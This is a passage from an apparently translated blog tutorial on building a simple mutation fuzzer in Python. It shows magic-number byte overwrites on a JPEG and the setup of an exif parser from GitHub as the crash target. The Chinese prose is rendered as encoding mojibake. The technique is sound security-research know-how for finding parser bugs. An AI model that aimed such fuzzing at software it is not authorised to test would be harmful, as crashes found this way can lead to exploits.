Mutation</h2><p>å¦‚æœæˆ‘ä»¬è·‘æˆ‘ä»¬çš„è„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>shasum</code>è¿™ä¸ªè¾“å‡ºï¼Œç„¶åä¸åŸæœ¬çš„<code>JPEG</code>è¿›è¡Œæ¯”è¾ƒã€‚</p><pre><code class="hljs reasonml">root@kali:~# shasum <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Canon_40D</span>.</span></span>jpg mutated.jpg c3d98686223ad69ea29c811aaab35d343ff1ae9e  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Canon_40D</span>.</span></span>jpga7b619028af3d8e5ac106a697b06efcde0649249  mutated.jpg</code></pre><p>è¿™ä¸ªçœ‹èµ·æ¥å¾ˆæœ‰æˆï¼Œå› ä¸ºå®ƒä»¬ç°åœ¨æœ‰ç€ä¸åŒçš„å“ˆå¸Œå€¼ï¼Œæˆ‘ä»¬æœªæ¥é€šè¿‡ç”¨ä¸€ä¸ªç¨‹åºï¼ˆè¢«ç§°ä¸º<a href="https://www.scootersoftware.com/">Beyond Compare</a>æˆ–<code>bcompare</code>ï¼‰æ¯”è¾ƒå®ƒä»¬ä»¥è¿›è¡Œåˆ†æï¼Œæˆ‘ä»¬å°†ä¼šæœ‰ç€ä¸åŒé«˜äº®çš„ä¸¤ä¸ª<code>hexdumps</code></p><p><img src="/img/fuzzing_like_a_caveman/bcompare.png" alt="bcompare.png"></p><p>æ­£å¦‚ä½ æ‰€æ˜¯ï¼Œåœ¨è¿™ä¸€ä¸ªå±å¹•çš„å…±äº«ä¸­ï¼Œæˆ‘ä»¬æœ‰ç€ä¸‰ä¸ªå­—èŠ‚çš„ä¸åŒï¼Œå®ƒä»¬å·²ç»è¿›è¡Œäº†å®ƒä»¬çš„ä½ç¿»è½¬ï¼Œè¿™ä¸ªåˆå§‹çš„åœ¨å·¦ä¾§ï¼Œè€Œå˜å¼‚çš„æ ·æœ¬åœ¨å³ä¾§ã€‚</p><p>è¿™ä¸ªå˜å¼‚çš„æ–¹æ³•ä¼¼ä¹èµ·ä½œç”¨äº†ï¼Œè®©æˆ‘ä»¬ç»§ç»­å®ç°æˆ‘ä»¬ç¬¬äºŒä¸ªå˜å¼‚çš„æ–¹æ³•ã€‚</p><h2 id="Gynvaelâ€™s-Magic-Numbers"><a href="#Gynvaelâ€™s-Magic-Numbers" class="headerlink" title="Gynvaelâ€™s Magic Numbers"></a>Gynvaelâ€™s Magic Numbers</h2><p>åœ¨å‰æ–‡æåˆ°çš„<code>GynvaelColdwind</code>çš„<a href="https://www.youtube.com/watch?v=BrDujogxYSk&t=2545">Basics of fuzzingâ€™ stream</a>ï¼Œä»–æšä¸¾äº†ä¸€äº›åœ¨ç¨‹åºä¸Šå¯ä»¥æœ‰ç€æ¯ç­å½±å“çš„<code>magic numbers</code>ï¼Œé€šå¸¸ï¼Œè¿™äº›æ•°å­—å’Œæ•°æ®ç±»å‹å¤§å°å’Œç®—æ•°å¼•èµ·çš„é”™è¯¯æœ‰å…³ï¼Œè¿™äº›è®¨è®ºçš„æ•°å­—æ˜¯ï¼š</p><ul><li>0xFF</li><li>0x7F</li><li>0x00</li><li>0xFFFF</li><li>0x0000</li><li>0xFFFFFFFF</li><li>0x00000000</li><li>0x80000000 &lt;â€”- minimum 32-bit int</li><li>0x40000000 &lt;â€”- just half of that amount</li><li>0x7FFFFFFF &lt;â€”- max 32-bit int</li></ul><p>å¦‚æœåœ¨<code>malloc()</code>æˆ–å…¶ä»–ç±»å‹çš„æ“ä½œè¿‡ç¨‹ä¸­å¯¹è¿™äº›ç±»å‹çš„å€¼æ‰§è¡Œä»»ä½•ç±»å‹çš„ç®—æœ¯è¿ç®—ï¼Œæº¢å‡ºå¯èƒ½å°±æ˜¯å¾ˆå¸¸è§ï¼Œä¾‹å¦‚å¦‚æœä½ åŠ <code>0x1</code>åˆ°<code>0xFF</code>åœ¨ä¸€ä¸ªå­—èŠ‚çš„å¯„å­˜å™¨ä¸Šï¼Œå®ƒå°†è½¬åˆ°<code>0x00</code>ï¼Œè¿™æ˜¯æ— æ„çš„è¡Œä¸ºï¼Œ<code>HEVD</code>å®é™…ä¸Šå·²ç»æœ‰ä¸€ä¸ªä¸è¿™ä¸ªç†å¿µç±»ä¼¼çš„æ•´æ•°æº¢å‡º<code>bug</code>ã€‚</p><p>å‡è®¾æˆ‘ä»¬çš„<code>fuzzer</code>é€‰æ‹©<code>0x7FFFFFFF</code>ä½œä¸ºå®ƒæƒ³è¦ä½¿ç”¨çš„é­”æ•°ï¼Œè¯¥å€¼æ˜¯4ä¸ªå­—èŠ‚é•¿ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»åœ¨æ•°ç»„ä¸­æ‰¾åˆ°ä¸€ä¸ªå­—èŠ‚ç´¢å¼•ï¼Œå¹¶è¦†ç›–è¯¥å­—èŠ‚åŠ ä¸Šæ¥ä¸‹æ¥çš„ä¸‰ä¸ªå­—èŠ‚ã€‚è®©æˆ‘ä»¬ç»§ç»­å¹¶å¼€å§‹åœ¨æˆ‘ä»¬çš„<code>fuzzer</code>ä¸­å®ç°å®ƒã€‚</p><h2 id="Implementing-Mutation-Method-2"><a href="#Implementing-Mutation-Method-2" class="headerlink" title="Implementing Mutation Method #2"></a>Implementing Mutation Method #2</h2><p>é¦–å…ˆæˆ‘ä»¬å°†æƒ³è¦åˆ›å»ºä¸€ä¸ªç±»ä¼¼<code>Gynvael</code>åšçš„ä¸€ä¸ªå…ƒç»„åˆ—è¡¨ï¼Œåœ¨è¿™å…ƒç»„ä¸­çš„ç¬¬ä¸€ä¸ªæ•°å­—æ˜¯<code>magic numbers</code>çš„å­—èŠ‚æ•°ï¼Œç¬¬äºŒä¸ªæ•°å­—æ˜¯åè¿›åˆ¶ä¸Šçš„å­—èŠ‚çš„å€¼ã€‚</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">magic</span>(<span class="hljs-params">data</span>):</span>    magic_vals = [    (<span class="hljs-number">1</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">127</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">2</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">2</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">128</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">64</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">127</span>)    ]    picked_magic = random.choice(magic_vals)    print(picked_magic)</code></pre><p>å¦‚æœæˆ‘ä»¬è·‘è¿™ä¸ªè„šæœ¬ï¼Œæˆ‘é—¨å°±å¯ä»¥çœ‹åˆ°å®ƒéšæœºåœ¨å–ä¸€ä¸ª<code>magic</code>å€¼å…ƒç»„</p><pre><code class="hljs python3">root@kali:~# python3 fuzzer.py Canon_40D.jpg (4, 64)root@kali:~# python3 fuzzer.py Canon_40D.jpg (4, 128)root@kali:~# python3 fuzzer.py Canon_40D.jpg (4, 0)root@kali:~# python3 fuzzer.py Canon_40D.jpg (2, 255)root@kali:~# python3 fuzzer.py Canon_40D.jpg (4, 0)</code></pre><p>æˆ‘ä»¬ç°åœ¨éœ€è¦ç”¨æ–°çš„<code>magic</code>1åˆ°4å­—èŠ‚çš„å€¼å¤å†™åˆ°<code>JPEG</code>ä¸­çš„1åˆ°4å­—èŠ‚çš„å€¼ä¸Šï¼Œæˆ‘ä»¬å°†è¦å»ºç«‹æˆ‘ä»¬å¯èƒ½çš„<code>indexes</code>å°±åƒä¹‹å‰é‚£ä¸ªæ–¹æ³•ä¸€æ ·ï¼Œéšæœºé€‰æ‹©<code>index</code>ç„¶åè¦†ç›–è¿™ä¸ª<code>index</code>ä¸Šçš„å­—èŠ‚ç”¨æˆ‘ä»¬<code>picked_magic</code>æ•°å­—ã€‚</p><p>æ‰€ä»¥ï¼Œå¦‚æœä¾‹å¦‚æˆ‘ä»¬å–çš„æ˜¯<code>(4, 128)</code>ï¼Œæˆ‘ä»¬çŸ¥é“è¿™æ˜¯4ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥è¿™ä¸ªé­”æ•°æ˜¯<code>0x80000000</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†åšäº›ç±»ä¼¼å¦‚ä¸‹çš„äº‹æƒ…ï¼š</p><pre><code class="hljs python">byte[x] = <span class="hljs-number">128</span>byte[x+<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>byte[x+<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>byte[x+<span class="hljs-number">3</span>] = <span class="hljs-number">0</span></code></pre><p>æ€»è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬çš„å‡½æ•°å¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">magic</span>(<span class="hljs-params">data</span>):</span>    magic_vals = [    (<span class="hljs-number">1</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">127</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">2</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">2</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">128</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">64</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">127</span>)    ]    picked_magic = random.choice(magic_vals)    length = len(data) - <span class="hljs-number">8</span>    index = range(<span class="hljs-number">0</span>, length)    picked_index = random.choice(index)    <span class="hljs-comment"># here we are hardcoding all the byte overwrites for all of the tuples that begin (1, )</span>    <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span>:        <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">255</span>:<span class="hljs-comment"># 0xFF</span>            data[picked_index] = <span class="hljs-number">255</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">127</span>:<span class="hljs-comment"># 0x7F</span>            data[picked_index] = <span class="hljs-number">127</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<span class="hljs-comment"># 0x00</span>            data[picked_index] = <span class="hljs-number">0</span>    <span class="hljs-comment"># here we are hardcoding all the byte overwrites for all of the tuples that begin (2, )</span>    <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">0</span>] == <span class="hljs-number">2</span>:        <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">255</span>:<span class="hljs-comment"># 0xFFFF</span>            data[picked_index] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">255</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<span class="hljs-comment"># 0x0000</span>            data[picked_index] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>    <span class="hljs-comment"># here we are hardcoding all of the byte overwrites for all of the tuples that being (4, )</span>    <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">0</span>] == <span class="hljs-number">4</span>:        <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">255</span>:<span class="hljs-comment"># 0xFFFFFFFF</span>            data[picked_index] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">255</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<span class="hljs-comment"># 0x00000000</span>            data[picked_index] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">0</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">128</span>:<span class="hljs-comment"># 0x80000000</span>            data[picked_index] = <span class="hljs-number">128</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">0</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">64</span>:<span class="hljs-comment"># 0x40000000</span>            data[picked_index] = <span class="hljs-number">64</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">0</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">127</span>:<span class="hljs-comment"># 0x7FFFFFFF</span>            data[picked_index] = <span class="hljs-number">127</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">255</span>            <span class="hljs-keyword">return</span> data</code></pre><h2 id="Analyzing-Mutation-2"><a href="#Analyzing-Mutation-2" class="headerlink" title="Analyzing Mutation #2"></a>Analyzing Mutation #2</h2><p>ç°åœ¨æˆ‘ä»¬è¿è¡Œè„šæœ¬ï¼Œç„¶ååœ¨<code>Beyond Compare</code>ä¸­åˆ†æç»“æœï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªä¸¤ä¸ªå­—èŠ‚çš„<code>0xA6 0x76</code>å°†è¢«å¤å†™æˆ<code>0xFF 0xFF</code>ã€‚</p><p><img src="/img/fuzzing_like_a_caveman/bcompare2.png" alt="bcompare2.png"></p><p>è¿™æ­£æ˜¯æˆ‘ä»¬æƒ³å®ç°çš„ã€‚</p><h2 id="Starting-to-Fuzz"><a href="#Starting-to-Fuzz" class="headerlink" title="Starting to Fuzz"></a>Starting to Fuzz</h2><p>ç°åœ¨æˆ‘ä»¬æœ‰äº†ä¸¤ä¸ªå¯é çš„ç¼–è¯‘æ•°æ®çš„æ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦åšï¼š</p><ul><li>ç”¨æˆ‘ä»¬çš„å‡½æ•°çš„å…¶ä¸­ä¸€ä¸ªå˜å¼‚æ•°æ®</li><li>ç”¨å˜å¼‚çš„æ•°æ®åˆ›å»ºä¸€ä¸ªæ–°çš„å›¾ç‰‡</li><li>æŠŠå˜å¼‚çš„å›¾ç‰‡å–‚ç»™æˆ‘ä»¬çš„äºŒè¿›åˆ¶ç”¨äºè§£æ</li><li>æ•è·ä»»ä½•<code>Segmentation faults</code>å¹¶ä¸”<code>log</code>äº§ç”Ÿè¿™ä¸ªçš„å›¾ç‰‡</li></ul><h3 id="Victim"><a href="#Victim" class="headerlink" title="Victim?"></a>Victim?</h3><p>å¯¹äºæˆ‘ä»¬çš„å—å®³è€…ç¨‹åºï¼Œæˆ‘ä»¬å°†ç”¨<code>site:github.com &quot;exif&quot; language:c</code>æœç´¢<code>Google</code>ï¼Œä»¥æ‰¾åˆ°ç”¨ C ç¼–å†™çš„å¼•ç”¨äº†<code>exif</code>çš„<code>Github</code>é¡¹ç›®ã€‚</p><p>å¿«é€Ÿæµè§ˆå°†æˆ‘ä»¬å¸¦åˆ°<code>https://github.com/mkttanabe/exif</code></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>git cloning</code>è¿™ä¸ªä»“åº“å’Œç”¨<code>README</code>ä¸­çš„<code>building with gcc</code>æŒ‡ä»¤æ¥å®‰è£…è¯¥ç¨‹åºï¼ˆæˆ‘å·²ç»æŠŠç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶æ”¾åˆ°äº†<code>/usr/bin</code>ï¼Œä»…ä»…æ˜¯ä¸ºäº†æ–¹ä¾¿ï¼‰</p><p>è®©æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹è¿™ä¸ªç¨‹åºæ€ä¹ˆå¤„ç†æˆ‘ä»¬åˆè§„çš„<code>JPEG</code>å§ã€‚</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~# exif Canon_40D.jpg -verbosesystem: little-endian  data: little-endian[Canon_40D.jpg] createIfdTableArray: result=<span class="hljs-number">5</span>&#123;<span class="hljs-number">0</span>TH IFD&#125; tags=<span class="hljs-number">11</span>tag[<span class="hljs-number">00</span>] <span class="hljs-number">0x010F</span> Make        type=<span class="hljs-number">2</span> count=<span class="hljs-number">6</span> val=[Canon]tag[<span class="hljs-number">01</span>] <span class="hljs-number">0x0110</span> Model        type=<span class="hljs-number">2</span> count=<span class="hljs-number">14</span> val=[Canon EOS <span class="hljs-number">40</span>D]tag[<span class="hljs-number">02</span>] <span class="hljs-number">0x0112</span> Orientation        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">1</span> tag[<span class="hljs-number">03</span>] <span class="hljs-number">0x011A</span> XResolution        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">72</span>/<span class="hljs-number">1</span> tag[<span class="hljs-number">04</span>] <span class="hljs-number">0x011B</span> YResolution        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">72</span>/<span class="hljs-number">1</span> tag[<span class="hljs-number">05</span>] <span class="hljs-number">0x0128</span> ResolutionUnit        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">2</span> tag[<span class="hljs-number">06</span>] <span class="hljs-number">0x0131</span> Software        type=<span class="hljs-number">2</span> count=<span class="hljs-number">11</span> val=[GIMP <span class="hljs-number">2.4</span><span class="hljs-number">.5</span>]tag[<span class="hljs-number">07</span>] <span class="hljs-number">0x0132</span> DateTime        type=<span class="hljs-number">2</span> count=<span class="hljs-number">20</span> val=[<span class="hljs-number">2008</span>:<span class="hljs-number">07</span>:<span class="hljs-number">31</span> <span class="hljs-number">10</span>:<span class="hljs-number">38</span>:<span class="hljs-number">11</span>]tag[<span class="hljs-number">08</span>] <span class="hljs-number">0x0213</span> YCbCrPositioning        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">2</span> tag[<span class="hljs-number">09</span>] <span class="hljs-number">0x8769</span> ExifIFDPointer        type=<span class="hljs-number">4</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">214</span> tag[<span class="hljs-number">10</span>] <span class="hljs-number">0x8825</span> GPSInfoIFDPointer        type=<span class="hljs-number">4</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">978</span> &#123;EXIF IFD&#125; tags=<span class="hljs-number">30</span>tag[<span class="hljs-number">00</span>] <span class="hljs-number">0x829A</span> ExposureTime        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">1</span>/<span class="hljs-number">160</span> tag[<span class="hljs-number">01</span>] <span class="hljs-number">0x829D</span> FNumber        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">71</span>/<span class="hljs-number">10</span> tag[<span class="hljs-number">02</span>] <span class="hljs-number">0x8822</span> ExposureProgram        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">1</span> tag[<span class="hljs-number">03</span>] <span class="hljs-number">0x8827</span> PhotographicSensitivity        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">100</span> tag[<span class="hljs-number">04</span>] <span class="hljs-number">0x9000</span> ExifVersion        type=<span class="hljs-number">7</span> count=<span class="hljs-number">4</span> val=<span class="hljs-number">0</span> <span class="hljs-number">2</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span> tag[<span class="hljs-number">05</span>] <span class="hljs-number">0x9003</span> DateTimeOriginal        type=<span class="hljs-number">2</span> count=<span class="hljs-number">20</span> val=[<span class="hljs-number">2008</span>:<span class="hljs-number">05</span>:<span class="hljs-number">30</span> <span class="hljs-number">15</span>:<span class="hljs-number">56</span>:<span class="hljs-number">01</span>]tag[<span class="hljs-number">06</span>] <span class="hljs-number">0x9004</span> DateTimeDigitized        type=<span class="hljs-number">2</span> count=<span class="hljs-number">20</span> val=[<span class="hljs-number">2008</span>:<span class="hljs-number">05</span>:<span class="hljs-number">30</span> <span class="hljs-number">15</span>:<span class="hljs-number">56</span>:<span class="hljs-number">01</span>]tag[<span class="hljs-number">07</span>] <span class="hljs-number">0x9101</span> ComponentsConfiguration        type=<span class="hljs-number">7</span> count=<span class="hljs-number">4</span> val=<span class="hljs-number">0x01</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> tag[<span class="hljs-number">08</span>] <span class="hljs-number">0x9201</span> ShutterSpeedValue        type=<span class="hljs-number">10</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">483328</span>/<span class="hljs-number">65536</span> tag[<span class="hljs-number">09</span>] <span class="hljs-number">0x9202</span> ApertureValue        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">368640</span>/<span class="hljs-number">65536</span> tag[<span class="hljs-number">10</span>] <span class="hljs-number">0x9204</span> ExposureBiasValue        type=<span class="hljs-number">10</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">0</span>/<span class="hljs-number">1</span> tag[<span class="hljs-number">11</span>] <span class="hljs-number">0x9207</span> MeteringMode        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">5</span> tag[<span class="hljs-number">12</span>] <span class="hljs-number">0x9209</span> Flash        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">9</span> tag[<span class="hljs-number">13</span>] <span class="hljs-number">0x920A</span> FocalLength        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">135</span>/<span class="hljs-number">1</span> tag[<span class="hljs-number">14</span>] <span class="hljs-number">0x9286</span> UserComment        type=<span class="hljs-number">7</span> count=<span class="hljs-number">264</span> val=<span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> (omitted)tag[<span class="hljs-number">15</span>] <span class="hljs-number">0x9290</span> SubSecTime        type=<span class="hljs-number">2</span> count=<span class="hljs-number">3</span> val=[<span class="hljs-number">00</span>]tag[<span class="hljs-number">16</span>] <span class="hljs-number">0x9291</span> SubSecTimeOriginal        type=<span class="hljs-number">2</span> count=<span class="hljs-number">3</span> val=[<span class="hljs-number">00</span>]tag[<span class="hljs-number">17</span>] <span class="hljs-number">0x9292</span> SubSecTimeDigitized        type=<span class="hljs-number">2</span> count=<span class="hljs-number">3</span> val=[<span class="hljs-number">00</span>]tag[<span class="hljs-number">18</span>] <span class="hljs-number">0xA000</span> FlashPixVersion        type=<span class="hljs-number">7</span> count=<span class="hljs-number">4</span> val=<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> tag[<span class="hljs-number">19</span>] <span class="hljs-number">0xA001</span> ColorSpace        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">1</span> tag[<span class="hljs-number">20</span>] <span class="hljs-number">0xA002</span> PixelXDimension        type=<span class="hljs-number">4</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">100</span> tag[<span class="hljs-number">21</span>] <span class="hljs-number">0xA003</span> PixelYDimension        type=<span class="hljs-number">4</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">68</span> tag[<span class="hljs-number">22</span>] <span class="hljs-number">0xA005</span> InteroperabilityIFDPointer        type=<span class="hljs-number">4</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">948</span> tag[<span class="hljs-number">23</span>] <span class="hljs-number">0xA20E</span> FocalPlaneXResolution        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">3888000</span>/<span class="hljs-number">876</span> tag[<span class="hljs-number">24</span>] <span class="hljs-number">0xA20F</span> FocalPlaneYResolution        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">2592000</span>/<span class="hljs-number">583</span> tag[<span class="hljs-number">25</span>] <span class="hljs-number">0xA210</span> FocalPlaneResolutionUnit        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">2</span> tag[<span class="hljs-number">26</span>] <span class="hljs-number">0xA401</span> CustomRendered        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">0</span> tag[<span class="hljs-number">27</span>] <span class="hljs-number">0xA402</span> ExposureMode        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">1</span> tag[<span class="hljs-number">28</span>] <span class="hljs-number">0xA403</span> WhiteBalance        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">0</span> tag[<span class="hljs-number">29</span>] <span class="hljs-number">0xA406</span> SceneCaptureType        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">0</span> &#123;Interoperability IFD&#125; tags=<span class="hljs-number">2</span>tag[<span class="hljs-number">00</span>] <span class="hljs-number">0x0001</span> InteroperabilityIndex        type=<span class="hljs-number">2</span> count=<span class="hljs-number">4</span> val=[R98]tag[<span class="hljs-number">01</span>] <span class="hljs-number">0x0002</span> InteroperabilityVersion        type=<span class="hljs-number">7</span> count=<span class="hljs-number">4</span> val=<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> &#123;GPS IFD&#125; tags=<span class="hljs-number">1</span>tag[<span class="hljs-number">00</span>] <span class="hljs-number">0x0000</span> GPSVersionID        type=<span class="hljs-number">1</span> count=<span class="hljs-number">4</span> val=<span class="hljs-number">2</span> <span class="hljs-number">2</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> &#123;<span class="hljs-number">1</span>ST IFD&#125; tags=<span class="hljs-number">6</span>tag[<span class="hljs-number">00</span>] <span class="hljs-number">0x0103</span> Compression        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">6</span> tag[<span class="hljs-number">01</span>] <span class="hljs-number">0x011A</span> XResolution        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">72</span>/<span class="hljs-number">1</span> tag[<span class="hljs-number">02</span>] <span class="hljs-number">0x011B</span> YResolution        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">72</span>/<span class="hljs-number">1</span> tag[<span class="hljs-number">03</span>] <span class="hljs-number">0x0128</span> ResolutionUnit        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">2</span> tag[<span class="hljs-number">04</span>] <span class="hljs-number">0x0201</span> JPEGInterchangeFormat        type=<span class="hljs-number">4</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">1090</span> tag[<span class="hljs-number">05</span>] <span class="hljs-number">0x0202</span> JPEGInterchangeFormatLength        type=<span class="hljs-number">4</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">1378</span> <span class="hljs-number">0</span>th IFD : Model = [Canon EOS <span class="hljs-number">40</span>D]Exif IFD : DateTimeOriginal = [<span class="hljs-number">2008</span>:<span class="hljs-number">05</span>:<span class="hljs-number">30</span> <span class="hljs-number">15</span>:<span class="hljs-number">56</span>:<span class="hljs-number">01</span>]</code></pre><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªç¨‹åºè§£æå‡º<code>tags</code>å¹¶è¯´æ˜ä¸å®ƒä»¬ç›¸å…³è”çš„å­—èŠ‚å€¼ï¼Œè¿™æ­£æ˜¯æˆ‘ä»¬æƒ³è¦æ‰¾åˆ°çš„ã€‚</p><h3 id="Chasing-Segfaults"><a href="#Chasing-Segfaults" class="headerlink" title="Chasing Segfaults"></a>Chasing Segfaults</h3><p>ç†æƒ³æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†ä¼šå–‚ç»™è¿™ä¸ªç¨‹åºä¸€äº›å˜å¼‚çš„æ•°æ®ï¼Œç„¶åå¾—åˆ°<code>segfault</code>ï¼Œæ„å‘³ç€æˆ‘ä»¬å·²æ‰¾åˆ°äº†<code>bug</code>ã€‚æˆ‘é‡åˆ°çš„é—®é¢˜æ˜¯å½“æˆ‘ä¸ºäº†<code>Segmentation 